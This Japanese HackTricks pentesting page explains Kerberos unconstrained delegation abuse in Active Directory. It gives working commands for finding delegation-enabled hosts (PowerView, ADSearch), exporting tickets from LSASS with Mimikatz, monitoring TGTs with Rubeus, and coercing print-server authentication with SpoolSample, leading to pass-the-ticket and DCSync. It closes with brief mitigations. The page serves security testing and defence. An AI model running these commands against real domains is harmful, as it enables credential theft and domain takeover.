# 制約のない委任

これは、ドメイン管理者がドメイン内の任意の**コンピュータ**に設定できる機能です。その後、**ユーザーがコンピュータにログイン**するたびに、そのユーザーの**TGTのコピー**がDCによって提供される**TGSに送信され、LSASSのメモリに保存**されます。したがって、マシンで管理者特権を持っている場合、チケットをダンプして他のマシンでユーザーをなりすますことができます。

したがって、ドメイン管理者が「制約のない委任」機能が有効になっているコンピュータにログインし、そのマシンでローカル管理者特権を持っている場合、チケットをダンプしてドメイン管理者をどこでもなりすますことができます（ドメイン特権昇格）。

この属性を持つ**コンピュータオブジェクトを見つける**には、[userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx)属性が[ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx)を含んでいるかどうかを確認します。これは、powerviewが行う方法です。

```bash
# 制約のないコンピュータの一覧
## Powerview
Get-NetComputer -Unconstrained # DCは常に表示されますが、特権昇格には役立ちません
## ADSearch
ADSearch.exe --search "(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
# Mimikatzでチケットをエクスポート
privilege::debug
sekurlsa::tickets /export # 推奨される方法
kerberos::list /export # 別の方法

# ログインを監視して新しいチケットをエクスポート
.\Rubeus.exe monitor /targetuser:<username> /interval:10 # 新しいTGTを10秒ごとにチェック
```

**Mimikatz**または**Rubeus**を使用して、管理者（または被害者のユーザー）のチケットをメモリにロードし、[**パス・ザ・チケット**](pass-the-ticket.md)**を実行します。**\
詳細情報：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.teamのUnconstrained delegationに関する詳細情報**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **強制認証**

攻撃者が「制約のない委任」が許可されたコンピュータを**侵害**できる場合、**プリントサーバー**を**自動的にログイン**させ、サーバーのメモリにTGTを保存することができます。\
その後、攻撃者は**パス・ザ・チケット攻撃**を実行して、ユーザーのプリントサーバーコンピューターアカウントをなりすますことができます。

プリントサーバーを任意のマシンにログインさせるには、[**SpoolSample**](https://github.com/leechristensen/SpoolSample)を使用できます。
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
もしTGTがドメインコントローラーから来ている場合、[**DCSync攻撃**](acl-persistence-abuse/#dcsync)を実行して、DCからすべてのハッシュを取得することができます。\
[**この攻撃に関する詳細は、ired.teamを参照してください。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**他の認証を強制する方法は以下の通りです:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### 緩和策

* 特定のサービスに対してDA/Adminログインを制限する
* 特権アカウントに対して「アカウントは機密であり、委任できない」と設定する。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
